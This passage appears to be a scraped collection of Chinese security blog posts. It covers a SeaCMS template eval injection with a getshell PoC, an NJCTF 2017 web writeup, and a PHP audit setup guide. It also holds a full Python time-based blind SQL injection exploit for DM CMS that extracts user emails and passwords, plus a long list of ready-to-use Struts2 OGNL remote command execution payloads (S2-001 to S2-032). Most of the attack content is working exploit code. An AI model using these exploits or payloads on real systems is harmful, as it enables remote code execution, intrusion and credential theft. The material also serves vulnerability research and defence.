总结该cms的注入漏洞很常规，主要是学习分析了该PoC，能在未来注入绕过的地方应用。 mysql的自定义变量@的应用，可以在一定程度上消除空格，以及正则\\bwhere\\b的绕过 /!02222select*/这个方法也是经常听说，也在这里用到了，一个很好的例子。 export_set的应用，比较重要的应用，在某些情况下可用于绕过"},{"title":"【Code Review】seacms v6.5 前台getshell","permalink":"http://blog.0kami.cn/2017/03/16/old-old-seacms-v6-5-getshell/","text":"概述前段时间放在90sec上的一篇代码审计，收拾一下放到自己博客上 分析cms版本：6.45直接上代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051function parseIf($content)&#123; if (strpos($content,&apos;&#123;if:&apos;)=== false)&#123; return $content; &#125;else&#123; $labelRule = buildregx(&quot;&#123;if:(.*?)&#125;(.*?)&#123;end if&#125;&quot;,&quot;is&quot;); $labelRule2=&quot;&#123;elseif&quot;; $labelRule3=&quot;&#123;else&#125;&quot;; preg_match_all($labelRule,$content,$iar); $arlen=count($iar[0]); $elseIfFlag=false; for($m=0;$m&lt;$arlen;$m++)&#123; $strIf=$iar[1][$m]; $strIf=$this-&gt;parseStrIf($strIf); $strThen=$iar[2][$m]; $strThen=$this-&gt;parseSubIf($strThen); if (strpos($strThen,$labelRule2)===false)&#123; if (strpos($strThen,$labelRule3)&gt;=0)&#123; $elsearray=explode($labelRule3,$strThen); $strThen1=$elsearray[0]; $strElse1=$elsearray[1]; echo &quot;if(&quot;.$strIf.&quot;) &#123; \\$ifFlag=true;&#125; else&#123; \\$ifFlag=false;&#125;&quot;; eval(&quot;if(&quot;.$strIf.&quot;)&#123;\\$ifFlag=true;&#125;else&#123;\\$ifFlag=false;&#125;&quot;); if ($ifFlag)&#123; $content=str_replace($iar[0][$m],$strThen1,$content);&#125; else &#123;$content=str_replace($iar[0][$m],$strElse1,$content);&#125; &#125;else&#123; @eval(&quot;if(&quot;.$strIf.&quot;) &#123; \\$ifFlag=true;&#125; else&#123; \\$ifFlag=false;&#125;&quot;); if ($ifFlag) $content=str_replace($iar[0][$m],$strThen,$content); else $content=str_replace($iar[0][$m],&quot;&quot;,$content);&#125; &#125;else&#123; $elseIfArray=explode($labelRule2,$strThen); $elseIfArrayLen=count($elseIfArray); $elseIfSubArray=explode($labelRule3,$elseIfArray[$elseIfArrayLen-1]); $resultStr=$elseIfSubArray[1]; $elseIfArraystr0=addslashes($elseIfArray[0]); @eval(&quot;if($strIf)&#123;\\$resultStr=\\&quot;$elseIfArraystr0\\&quot;;&#125;&quot;); for($elseIfLen=1;$elseIfLen&lt;$elseIfArrayLen;$elseIfLen++)&#123; $strElseIf=getSubStrByFromAndEnd($elseIfArray[$elseIfLen],&quot;:&quot;,&quot;&#125;&quot;,&quot;&quot;); $strElseIf=$this-&gt;parseStrIf($strElseIf); $strElseIfThen=addslashes(getSubStrByFromAndEnd($elseIfArray[$elseIfLen],&quot;&#125;&quot;,&quot;&quot;,&quot;start&quot;)); @eval(&quot;if(&quot;.$strElseIf.&quot;)&#123;\\$resultStr=\\&quot;$strElseIfThen\\&quot;;&#125;&quot;); @eval(&quot;if(&quot;.$strElseIf.&quot;)&#123;\\$elseIfFlag=true;&#125;else&#123;\\$elseIfFlag=false;&#125;&quot;); if ($elseIfFlag) &#123;break;&#125; &#125; $strElseIf0=getSubStrByFromAndEnd($elseIfSubArray[0],&quot;:&quot;,&quot;&#125;&quot;,&quot;&quot;); $strElseIfThen0=addslashes(getSubStrByFromAndEnd($elseIfSubArray[0],&quot;&#125;&quot;,&quot;&quot;,&quot;start&quot;)); if(strpos($strElseIf0,&apos;==&apos;)===false&amp;&amp;strpos($strElseIf0,&apos;=&apos;)&gt;0)$strElseIf0=str_replace(&apos;=&apos;, &apos;==&apos;, $strElseIf0); @eval(&quot;if(&quot;.$strElseIf0.&quot;)&#123;\\$resultStr=\\&quot;$strElseIfThen0\\&quot;;\\$elseIfFlag=true;&#125;&quot;); $content=str_replace($iar[0][$m],$resultStr,$content); &#125; &#125; return $content; &#125; &#125; 上面主要逻辑为解析html文件中的{if:}{end if}标签代码，可以看到没有做任何处理就eval，那么我们查找一下对应调用的地方会不会有漏洞。主要关注前台，找到一处解析搜索结果的页面（search.php），代码比较多，一点一点来看。找到调用的位置line 212$content=$mainClassObj-&gt;parseIf($content);往上看，发现他的逻辑是先解析其他类型的标签，比如{searchpage:page}那么接下来的思路，主要是2点，查找对应if标签可控的位置，另一种就是查找其他标签的可控内容，写入if标签我找到一处其他标签可控且没有做任何处理的位置，直接写入if标签语句即可造成任意代码执行1234567891011121314function echoSearchPage()&#123; global $dsql,$cfg_iscache,$mainClassObj,$page,$t1,$cfg_search_time,$searchtype,$searchword,$tid,$year,$letter,$area,$yuyan,$state,$ver,$order,$jq,$money,$cfg_basehost; $order = !empty($order)?$order:time;.........$content = str_replace(&quot;&#123;searchpage:page&#125;&quot;,$page,$content); $content = str_replace(&quot;&#123;seacms:searchword&#125;&quot;,$searchword,$content); $content = str_replace(&quot;&#123;seacms:searchnum&#125;&quot;,$TotalResult,$content); $content = str_replace(&quot;&#123;searchpage:ordername&#125;&quot;,$order,$content);......... order变量可控并且在调用parseIf函数前先解析，所以我们可以通过order写入if标签。查看一下具体html代码1234567&lt;div class=&quot;btn-toolbar&quot; role=&quot;toolbar&quot;&gt; &lt;div class=&quot;btn-group&quot;&gt; &lt;a href=&quot;&#123;searchpage:order-time-link&#125;&quot; &#123;if:&quot;&#123;searchpage:ordername&#125;&quot;==&quot;time&quot;&#125; class=&quot;btn btn-success&quot; &#123;else&#125; class=&quot;btn btn-default&quot; &#123;end if&#125; id=&quot;orderhits&quot;&gt;最新上映&lt;/a&gt; &lt;a href=&quot;&#123;searchpage:order-hit-link&#125;&quot; &#123;if:&quot;&#123;searchpage:ordername&#125;&quot;==&quot;hit&quot;&#125; class=&quot;btn btn-success&quot; &#123;else&#125; class=&quot;btn btn-default&quot; &#123;end if&#125; id=&quot;orderaddtime&quot;&gt;最近热播&lt;/a&gt; &lt;a href=&quot;&#123;searchpage:order-score-link&#125;&quot; &#123;if:&quot;&#123;searchpage:ordername&#125;&quot;==&quot;score&quot;&#125; class=&quot;btn btn-success&quot; &#123;else&#125; class=&quot;btn btn-default&quot; &#123;end if&#125; id=&quot;ordergold&quot;&gt;评分最高&lt;/a&gt; &lt;/div&gt; &lt;/div&gt; 那么接下来就可以构造poc了，类似sql注入，我们先把前面的if标签语句闭合，写入恶意代码并闭合后面的if标签。example：}{end if}{if:1)phpinfo();if(1}{end if}本地验证一下 总结这是一个比较经典的漏洞，也可以被称为模版解析吧我觉得：）ps: 后悔啊，没有先提交个poc平台T_T"},{"title":"【CTF】NJCTF2017 writeup","permalink":"http://blog.0kami.cn/2017/03/15/old-old-njctf-2017/","text":"概述辞职后没事情干，刚好赶上njctf，还是一样菜啊，只做了7道题，还要继续努力💪（ps:毕业设计什么鬼啊）写一下web的writeup，由于题目还开着，把没做出来的做一遍，纪录一下我觉得有必要记的题 Web题Login（100）好吧，这道题取了巧，谁让大黑客们都是弱密码呢！！！！由于没有做验证码机制，所以扫了一波弱口令，然后…然后就进去啦其实这道题考的是mysql的长度限制漏洞。利用2个mysql的特性 当数据超过建表时的规定的数据大小，mysql将超过的部分截断 当select时where查询字句中的数据如果最后以空格结尾，mysql默认将空格去除查询那么利用这2个特性，我们只要注册一个admin+N*%20+x就可以已admin登陆，然后getflag：NJCTF{4R3_Y0u_7H3_Re41_aDM1N?} Get Flag(100)这道题考了命令执行漏洞首先发现存在文件任意读取漏洞，那么尝试读取一下源码，最后试出来是app.py可以看到有个命令执行并且是可控的，但是过滤了一些字符，用&amp;就可以绕过。ls 查看一下可以看到flag文件9iZM2qTEmq67SOdJp%!oJm2%M4!nhS_thi5_flagcat一波，这里的特殊字符转移是关键 come on(200)具体看大佬们的writeup即可，这道题主要学到了其盲注的注入方式。binary函数用来区分大小写 12345select xxx from xxx like x%select xxx from xxx like xx%select xxx from xxx like xxx%select xxx from xxx like xxxx%... 通过like来住出数据 Be Admin(300)首先发现有.bak文件，下下来看一下,发现这道题主要考的是cbc字节翻转攻击和padding oracle attack.首先由于登陆出存在注入，我们可以把数据中的encrypt_pass取出来登陆绕过可以通过php弱类型比较来绕过，admin／0即可登陆要通过cbc字节翻转必须知道defaultId的值，所以我们需要先跑出defaultId的值padding oracle attack参考padding oracle attack符合我们现在的情况： 已知真实IV 已知对应cipher text 当解密失败ERROR错误题目环境可能坏了，本地搭一下，跑一下中间值需要注意的一点是padding oracle attack第一个字符没办法跑出来，由于最后一个字符解出来是空白所以还是error，不过没关系暴力一遍就好了（ps：有了原理，写代码很容易，就不放代码了） 总结欠缺的还是很多，继续💪"},{"title":"【OTHERS】php代码审计前的准备","permalink":"http://blog.0kami.cn/2017/02/03/old-old-code-review-pre-prepare/","text":"概述所谓“工欲善其事,必先利其器”，在代码审计前，我们需要准备提高我们审计效率的工具。 环境 Mac xampp(可以用phpstudy或者是其他集成环境代替) Navicat Premium(个人认为Mac下最好的数据库管理工具，学生党只能用**,有能力尽量支持正版) phpstorm(这里的IDE用的是我自己比较习惯的，也可以使用其他你比较熟悉的) xdebug(用来动态调试) 终端 浏览器(firefox、chrome,这里使用firefox,hackbar是个好东西) 安装上述的软件之类的就不说了，下文主要是动态调试环境搭建。 动态调试环境php添加xdebug配置xampp的php.ini位于/install/path/etc/php.ini，在配置文件最后添加上 1234567891011[xdebug]zend_extension=/Applications/XAMPP/xamppfiles/lib/php/extensions/no-debug-non-zts-20131226/xdebug.soxdebug.remote_autostart=onxdebug.remote_enable=onxdebug.remote_enable=1xdebug.remote_mode=&quot;req&quot;xdebug.remote_log=&quot;/var/log/xdebug.log&quot;xdebug.remote_host=localhost/127.0.0.1xdebug.remote_port=9000xdebug.remote_handler=&quot;dbgp&quot;xdebug.idekey=&quot;PhpStorm&quot; so文件是xampp自带的，mac下的配置可以直接copy我的保存后重启apache firefox安装xdebug扩展firefox下的xdebug扩展叫 the easiest xdebug，搜索一下安装安装完成后点亮工具栏上的甲虫，开启调试设置key,更php配置文件中相同 配置phpstorm打开Preferences-&gt;Languages&amp;Framework-&gt;php如图设置servers，接着设置debug下的DBGp Proxy设置完成后在工具栏处找到edit Configurations新增php web application接下来就可以愉快的下断点，动态调试了 mysql执行审计监控在navicat或终端中运行以下2句 set global general_log=on;set global log_output=’table’; 查看mysql.general_log表可以看到运行过的sql语句，方便我们查询win下可以用seay的代码审计工具，带了mysql的sql监控 终端终端主要用到了grep这个工具，网上有很多相关的教材。主要匹配输入输出点，危险函数等等具体的以后有空了再补充 总结记录一下过程，以后能看看，愉快的代码审计吧:P"},{"title":"【Code Review】DM企业建站系统前台盲注","permalink":"http://blog.0kami.cn/2017/01/29/old-old-DM-sql-injection/","text":"概述今天搞了一下动态调试的东西，然后顺便看了看上次下的DM企业建站系统2017.01.23。 前台cookie 时间盲注大致跟了一下几个入口文件，该套cms主要的安全措施为htmlentities，在POST&amp;&amp;GET的输入点做了html实体化的操作，但是这并不转义单引号（默认不转义单引号具体可看htmlentities），看了一下进行数据库查询的sql语句，涉及到字符串类型时，都是单引号闭合，那么很清楚，在进行数据库查询时容易产生sql注入漏洞。那么接下来主要找一下进行数据库操作的位置。 POST&amp;&amp;GET COOKIE ps：这里就随便找了一个地方，因为这套系统注入不要太多，连后台登陆都可以 :P 前面提到对POST&amp;&amp;GET做了实体转义，但是grep找了一下cookie，发现并没有对cookie的值进行安全操作，直接带入数据库查询。indexDM_load.php Line 108 12345678910111213...if(@$_COOKIE[&quot;curstyle&quot;]&lt;&gt;&apos;&apos;) $curstyle = $_COOKIE[&quot;curstyle&quot;];else $curstyle = $row[&apos;curstyle&apos;]; ...$sqlstyle = &quot;SELECT * from &quot;.TABLE_STYLE.&quot; where pidname=&apos;$curstyle&apos; $andlangbh limit 1&quot;; //echo $sqlstyle;exit;if(getnum($sqlstyle)&gt;0)&#123; $rowstyle = getrow($sqlstyle); 上述为漏洞的主要成因点，如果cookie中存在curstyle,优先选用cookie中的值，然后带入数据库查询。由于没有找到具体回显数据的地方，所以采用时间盲注的方式获取数据。 带上自己写的EXP 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879#!/usr/bin/env python# -*- coding: utf-8 -*-# Created by wh1t3P1g at 2017/1/30import requests,timeclass CookieBlindSqlInjection: def __init__(self,url): self.url=url self.len=0 def getLength(self,column,table): payload0 = &quot;curstyle=1&apos;||if((select length(cast(bin(length(&#123;column&#125;)) as char)) from &#123;table&#125; limit &#123;line_start&#125;,1)=&#123;flag&#125;,sleep(5),1)=1#&quot; payload1 = &quot;curstyle=1&apos;||if((select substr(bin(length(&#123;column&#125;)),&#123;col_start&#125;,1) from &#123;table&#125; limit &#123;line_start&#125;,1)=1,1,sleep(5))=1#&quot; #first confirm bin-format data length len=0 for i in range(1,9): cookie=payload0.format(column=column,table=table,line_start=0,flag=i) flag=self.send(cookie) if flag==&quot;0&quot;: len=i break res=&quot;&quot; for i in range(1,len+1): cookie=payload1.format(column=column,col_start=i,table=table,line_start=0) flag=self.send(cookie) res+=flag # print res self.len=int(res,2) pprint(&quot;*&quot;, &quot;fetch &quot;+column+&quot; length: &quot;+str(self.len)) return int(res,2) def getData(self,column,table): payload0=&quot;curstyle=1&apos;||if((select length(cast(bin(ascii(substr(&#123;column&#125;,&#123;data_start&#125;,1))) as char)) from &#123;table&#125; limit &#123;line_start&#125;,1)=&#123;flag&#125;,sleep(5),1)=1#&quot; payload1 = &quot;curstyle=1&apos;||if((select substr(bin(ascii(substr(&#123;column&#125;,&#123;data_start&#125;,1))),&#123;col_start&#125;,1) from &#123;table&#125; limit &#123;line_start&#125;,1)=1,1,sleep(5))=1#&quot; total_res=&quot;&quot; for i in range(1,self.len+1):#具体数据的长度 len = 0 for j in range(1, 9): cookie = payload0.format(column=column,data_start=i, table=table, line_start=0, flag=j) flag = self.send(cookie) if flag == &quot;0&quot;: len = j break # print &quot;len:&quot;+str(len) res = &quot;&quot; for k in range(1, len + 1): cookie = payload1.format(column=column,data_start=i, col_start=k, table=table, line_start=0) flag = self.send(cookie) res += flag # print res total_res+=chr(int(res,2)) pprint(&quot;*&quot;, &quot;fetch &quot;+column+&quot;: &quot;+total_res) return total_res def send(self,cookie): headers=&#123;&quot;Cookie&quot;:cookie&#125; try: r = requests.get(self.url, headers=headers,timeout=4) return &quot;1&quot; except: return &quot;0&quot;def pprint(flag,content): print &quot;[&#123;flag&#125;] [&#123;time&#125;] &#123;content&#125;&quot; \\ .format(flag=flag, time=time.asctime(time.localtime(time.time())), content=content)if __name__==&apos;__main__&apos;: cookieBlindSqlInjection=CookieBlindSqlInjection(&quot;http://127.0.0.1/cms/DM/20170123/&quot;) pprint(&quot;*&quot;,&quot;program start&quot;) pprint(&quot;*&quot;, &quot;start fetching column[email]&quot;) cookieBlindSqlInjection.getLength(&quot;email&quot;,&quot;zzz_user&quot;) email=cookieBlindSqlInjection.getData(&quot;email&quot;,&quot;zzz_user&quot;) pprint(&quot;*&quot;, &quot;start fetching column[ps]&quot;) cookieBlindSqlInjection.getLength(&quot;ps&quot;, &quot;zzz_user&quot;) ps=cookieBlindSqlInjection.getData(&quot;ps&quot;, &quot;zzz_user&quot;) pprint(&quot;*&quot;, &quot;[email]: &quot;+email+&quot; ,[ps]: &quot;+ps) pprint(&quot;*&quot;, &quot;program done&quot;) ps:DM这个鬼，代码写的好乱啊T_T"},{"title":"【VULNERABLITY】Struts2命令执行各版本记录","permalink":"http://blog.0kami.cn/2017/01/13/old-old-Struts2-history-payload/","text":"概述最近在写Struts2的一些PoC，记录一下各个版本的PoC方便到时候查阅。先提一下参考的前辈们的网址，感谢🙏 http://rickgray.me/2016/05/06/review-struts2-remote-command-execution-vulnerabilities.html http://www.cnblogs.com/LittleHann/p/4606891.html https://cwiki.apache.org/confluence/display/WW/S2-xxx http://blog.nsfocus.net/tech/%E7%83%AD%E7%82%B9%E8%B7%9F%E8%B8%AA/2016/06/16/Struts2-S2-037(CVE-2016-4438)%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.html https://cwiki.apache.org/confluence/display/WW/S2-009 Struts2命令执行集合下文不是具体的分析文，能力有限，仅记录一下以做将来复习查用。过段时间会将所有的漏洞环境上传到github上，环境来源大部分为我偶像rickgray博客上共享的以及官网上下的对应版本的示例环境。update:2017/1/16 环境地址 Struts2 S2-001影响版本：2.0.0 - 2.0.8 具体详情：https://struts.apache.org/docs/s2-001.html 该漏洞因为用户提交表单数据并且验证失败时，后端会将用户之前提交的参数值使用 OGNL 表达式 %{value} 进行解析，然后重新填充到对应的表单数据中。例如注册或登录页面，提交失败后端一般会默认返回之前提交的数据，由于后端使用 %{value} 对提交的数据执行了一次 OGNL 表达式解析，所以可以直接构造 Payload 进行命令执行 上文引用rickgray的描述。 构造PoC获取tomcat执行路径1%&#123;&quot;tomcatBinDir&#123;&quot;+@java.lang.System@getProperty(&quot;user.dir&quot;)+&quot;&#125;&quot;&#125; 获取web根目录1%&#123;#req=@org.apache.struts2.ServletActionContext@getRequest(),#response=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;).getWriter(),#response.println(#req.getRealPath(&apos;/&apos;)),#response.flush(),#response.close()&#125; 执行系统命令1%&#123;#a=(new java.lang.ProcessBuilder(&quot;whoami&quot;)).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#matt=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),#matt.getWriter().println(new java.lang.String(#e)),#matt.getWriter().flush(),#matt.getWriter().close()&#125; Struts2 S2-005影响版本: 2.0.0 - 2.1.8.1 漏洞详情: http://struts.apache.org/docs/s2-005.html struts2漏洞的起源源于S2-003(受影响版本: 低于Struts 2.0.12)，struts2会将http的每个参数名解析为ongl语句执行(可理解为java代码)。ongl表达式通过#来访问struts的对象，struts框架通过过滤#字符防止安全问题，然而通过unicode编码(\\u0023)或8进制(\\43)即绕过了安全限制，对于S2-003漏洞，官方通过增加安全配置(禁止静态方法调用和类方法执行等)来修补，但是安全配置被绕过再次导致了漏洞，攻击者可以利用OGNL表达式讲这2个选项打开，S2-003的修补方案把自己上了一个锁，但是把锁钥匙给插在了锁头上 上文引用LittleHann的描述 构造PoC获取web根目录1(&apos;\\43_memberAccess.allowStaticMethodAccess&apos;)(a)=true&amp;(b)((&apos;\\43context[\\&apos;xwork.MethodAccessor.denyMethodExecution\\&apos;]\\75false&apos;)(b))&amp;(&apos;\\43c&apos;)((&apos;\\43_memberAccess.excludeProperties\\75@java.util.Collections@EMPTY_SET&apos;)(c))&amp;(g)((&apos;\\43req\\75@org.apache.struts2.ServletActionContext@getRequest()&apos;)(d))&amp;(i2)((&apos;\\43xman\\75@org.apache.struts2.ServletActionContext@getResponse()&apos;)(d))&amp;(i97)((&apos;\\43xman.getWriter().println(\\43req.getRealPath(%22\\u005c%22))&apos;)(d))&amp;(i99)((&apos;\\43xman.getWriter().close()&apos;)(d)) 执行系统命令1(&apos;\\43_memberAccess.allowStaticMethodAccess&apos;)(a)=true&amp;(b)((&apos;\\43context[\\&apos;xwork.MethodAccessor.denyMethodExecution\\&apos;]\\75false&apos;)(b))&amp;(&apos;\\43c&apos;)((&apos;\\43_memberAccess.excludeProperties\\75@java.util.Collections@EMPTY_SET&apos;)(c))&amp;(g)((&apos;\\43mycmd\\75\\&apos;&quot;+cmd+&quot;\\&apos;&apos;)(d))&amp;(h)((&apos;\\43myret\\75@java.lang.Runtime@getRuntime().exec(\\43mycmd)&apos;)(d))&amp;(i)((&apos;\\43mydat\\75new\\40java.io.DataInputStream(\\43myret.getInputStream())&apos;)(d))&amp;(j)((&apos;\\43myres\\75new\\40byte[51020]&apos;)(d))&amp;(k)((&apos;\\43mydat.readFully(\\43myres)&apos;)(d))&amp;(l)((&apos;\\43mystr\\75new\\40java.lang.String(\\43myres)&apos;)(d))&amp;(m)((&apos;\\43myout\\75@org.apache.struts2.ServletActionContext@getResponse()&apos;)(d))&amp;(n)((&apos;\\43myout.getWriter().println(\\43mystr)&apos;)(d)) 上面2个PoC摘自k8team，为了写PoC，有所改动，但是这里就不贴上来了：） Struts2 S2-009影响版本: 2.0.0 - 2.3.1.1 漏洞详情: https://struts.apache.org/docs/s2-009.html 漏洞利用点跟S2-003和S2-005类似，利用OGNL表达式(1)(2),会执行1的OGNL表达式，009构造了的方法为test=(some OGNL 表达式)(1)&amp;z[(test)(1)]=true。z[(test)(1)]=true,对struts2来说是合法的参数，但是(test)(1)会执行上述说的方法，test的值被带入计算，造成命令执行。 构造PoC弹计算器ps:实验环境试了好几次都不能执行系统命令，路过的大佬求指教：） 1person.name=(#context[&quot;xwork.MethodAccessor.denyMethodExecution&quot;]= new java.lang.Boolean(false), #_memberAccess[&quot;allowStaticMethodAccess&quot;]= new java.lang.Boolean(true), @java.lang.Runtime@getRuntime().exec(&apos;open /Applications/Calculator.app&apos;))(meh)&amp;z[(person.name)(&apos;meh&apos;)]=true 用的是person/new-person.action这个控制器 获取web根目录1person.name=%28%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%20new%20java.lang.Boolean%28false%29%2C%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23req%3D@org.apache.struts2.ServletActionContext@getRequest%28%29%2C%23outstr%3D@org.apache.struts2.ServletActionContext@getResponse%28%29.getWriter%28%29%2C%23outstr.println%28%27webpath%3A%27%2b%23req.getRealPath%28%22%2f%22%29%29%2C%23outstr.close%28%29%29%28meh%29&amp;z%5B%28person.name%29%28%27meh%27%29%5D&quot; Struts2 S2-012影响版本: 2.0.0 - 2.3.13 漏洞详情: https://cwiki.apache.org/confluence/display/WW/S2-012 Action 中 Result 时使用了重定向类型，并且还使用 ${param_name} 作为重定向变量,struts在获取其值时会执行OGNL表达式，从而造成命令执行 构造PoC获取web根路径1%25%7B%28%23context%5B%27xwork.MethodAccessor.denyMethodExecution%27%5D%3Dfalse%29%28%23_memberAccess%5B%27allowStaticMethodAccess%27%5D%3Dtrue%29%28%23req%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletRequest%27%29%2C%23response%3D%23context.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%2C%23response.println%28%27webpath%3A%27%2b%23req.getSession%28%29.getServletContext%28%29.getRealPath%28%27%2f%27%29%29%2C%23response.flush%28%29%2C%23response.close%28%29%29%7D 执行系统命令1%25%7B%28%23context%5B%27xwork.MethodAccessor.denyMethodExecution%27%5D%3Dfalse%29%28%23_memberAccess%5B%27allowStaticMethodAccess%27%5D%3Dtrue%29%28%23a%3D%28new%20java.lang.ProcessBuilder%28%27whoami%27%29%29.start%28%29%2C%23b%3D%23a.getInputStream%28%29%2C%23c%3Dnew%20java.io.InputStreamReader%28%23b%29%2C%23d%3Dnew%20java.io.BufferedReader%28%23c%29%2C%23e%3Dnew%20char%5B50000%5D%2C%23d.read%28%23e%29%2C%23matt%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29%2C%23matt.getWriter%28%29.println%28%27dbapp%3A%27%2bnew%20java.lang.String%28%23e%29%29%2C%23matt.getWriter%28%29.flush%28%29%2C%23matt.getWriter%28%29.close%28%29%29%7D%0A%0A Struts2 S2-013/S2-014影响版本: 2.0.0 - 2.3.14.1 漏洞详情: https://cwiki.apache.org/confluence/display/WW/S2-013,https://cwiki.apache.org/confluence/display/WW/S2-014 标签s:url和s:a中提供include参数，其参数值可以为 none - include no parameters in the URL (default) get - include only GET parameters in the URL all - include both GET and POST parameters in the URL 如果参数值为get或all，在获取对应的参数值时执行了OGNL表达式 构造PoC获取web根目录1a=$&#123;(%23_memberAccess[&quot;allowStaticMethodAccess&quot;]=true,%23req=@org.apache.struts2.ServletActionContext@getRequest(),%23out=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23out.println(&apos;webpath%3a&apos;%2b%23req.getRealPath(&quot;/&quot;)),%23out.close())&#125; 执行系统命令1a=$&#123;(%23_memberAccess[&quot;allowStaticMethodAccess&quot;]=true,%23a=@java.lang.Runtime@getRuntime().exec(&apos;&quot;+cmd+&quot;&apos;).getInputStream(),%23b=new+java.io.InputStreamReader(%23a),%23c=new+java.io.BufferedReader(%23b),%23d=new+char[50000],%23c.read(%23d),%23out=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23out.println(&apos;dbapp%3a&apos;%2bnew java.lang.String(%23d)),%23out.close())&#125; Struts2 S2-016影响版本: 2.0.0 - 2.3.15 漏洞详情: https://struts.apache.org/docs/s2-016.html DefaultActionMapper 类支持以 action:，redirect: 和 redirectAction: 作为访问前缀，前缀后面可以跟 OGNL 表达式，由于 Struts2 未对其进行过滤，导致任意 Action 可以使用这些前缀执行任意 OGNL 表达式，从而导致任意命令执行 上文引用rickgray的描述。 构造PoC获取web根目录1?redirect:$&#123;#req=#context.get(&apos;co&apos;+&apos;m.open&apos;+&apos;symphony.xwo&apos;+&apos;rk2.disp&apos;+&apos;atcher.HttpSer&apos;+&apos;vletReq&apos;+&apos;uest&apos;),#resp=#context.get(&apos;co&apos;+&apos;m.open&apos;+&apos;symphony.xwo&apos;+&apos;rk2.disp&apos;+&apos;atcher.HttpSer&apos;+&apos;vletRes&apos;+&apos;ponse&apos;),#resp.setCharacterEncoding(&apos;UTF-8&apos;),#ot=#resp.getWriter (),#ot.print(&apos;web&apos;),#ot.print(&apos;path:&apos;),#ot.print(#req.getSession().getServletContext().getRealPath(&apos;/&apos;)),#ot.flush(),#ot.close()&#125; 执行系统命令1?redirect:$&#123;#a=(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&apos;whoami&apos;&#125;)).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#matt=#context.get(&apos;co&apos;+&apos;m.ope&apos;+&apos;nsymph&apos;+&apos;ony.x&apos;+&apos;wor&apos;+&apos;k2.disp&apos;+&apos;atch&apos;+&apos;er.HttpSe&apos;+&apos;rvletRe&apos;+&apos;sponse&apos;),#matt.getWriter().println(new java.lang.String(#e)),#matt.getWriter().flush(),#matt.getWriter().close()&#125;&apos; 还有一种比较隐蔽的方法，将PoC放在文件上传的name处，过waf。 Struts2 S2-019影响版本: 2.0.0 - 2.3.15.1 漏洞详情: https://cwiki.apache.org/confluence/display/WW/S2-019 该漏洞成因为开启了开发者模式，传入debug=command&amp;expression=导致执行OGNL表达式，从而造成命令执行漏洞。 构造PoC获取web根路径1debug=command&amp;expression=%23req%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletRequest%27%29%2C%23resp%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29%2C%23resp.setCharacterEncoding%28%27UTF-8%27%29%2C%23resp.getWriter%28%29.println%28%27webpath%3A%27%2b%23req.getSession%28%29.getServletContext%28%29.getRealPath%28%27%2f%27%29%29%2C%23resp.getWriter%28%29.flush%28%29%2C%23resp.getWriter%28%29.close%28%29 执行系统命令1debug=command&amp;expression=%23a%3D%28new%20java.lang.ProcessBuilder%28%27whoami%27%29%29.start%28%29%2C%23b%3D%23a.getInputStream%28%29%2C%23c%3Dnew%20java.io.InputStreamReader%28%23b%29%2C%23d%3Dnew%20java.io.BufferedReader%28%23c%29%2C%23e%3Dnew%20char%5B50000%5D%2C%23d.read%28%23e%29%2C%23out%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29%2C%23out.getWriter%28%29.println%28%27dbapp%3A%27%2bnew%20java.lang.String%28%23e%29%29%2C%23out.getWriter%28%29.flush%28%29%2C%23out.getWriter%28%29.close%28%29%0A Struts2 S2-032影响版本: 2.3.20 - 2.3.28 (except 2.3.20.3 and 2.3.24.3) 漏洞详情: https://struts.apache.org/docs/s2-032.html 在配置了 Struts2 DMI 为 True 的情况下，可以使用 method: Action 前缀去调用声明为 public 的函数，DMI 的相关使用方法可参考官方介绍（Dynamic Method Invocation），这个 DMI 的调用特性其实一直存在，只不过在低版本中 Strtus2 不会对 name 方法值做 OGNL 计算，而在高版本中会，代码详情可参考阿尔法实验室的报告 - 《Apache Struts2 s2-032技术分析及漏洞检测脚本》 上文引用rickgray的描述。 构造PoC获取web根目录1?method:#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,#req=#context.get(#parameters.a[0]),#resp=#context.get(#parameters.b[0]),#resp.setCharacterEncoding(#parameters.c[0]),#ot=#resp.getWriter (),#ot.print(#parameters.e[0]+#req.getSession().getServletContext().getRealPath(#parameters.d[0])),#ot.flush(),#ot.close&amp;a=com.opensymphony.xwork2.dispatcher.HttpServletRequest&amp;b=com.opensymphony.xwork2.dispatcher.HttpServletResponse&amp;c=UTF-8&amp;d=/&amp;e=webpath: 执行系统命令1?method:#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,#a=(new java.lang.ProcessBuilder(#parameters.a[0])).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#matt=#context.get(#parameters.b[0]),#matt.getWriter().println(#parameters.c[0]+new java.lang.String(#e)),#matt.getWriter().flush(),#matt.getWriter().close&amp;a=whoami&amp;b=com.opensymphony.xwork2.dispatcher.HttpServletResponse&amp;c=flag: Struts2 S2-037影响版本: 2.3.20 - 2.3.28.1 漏洞详情: http://struts.apache.org/docs/s2-037.html 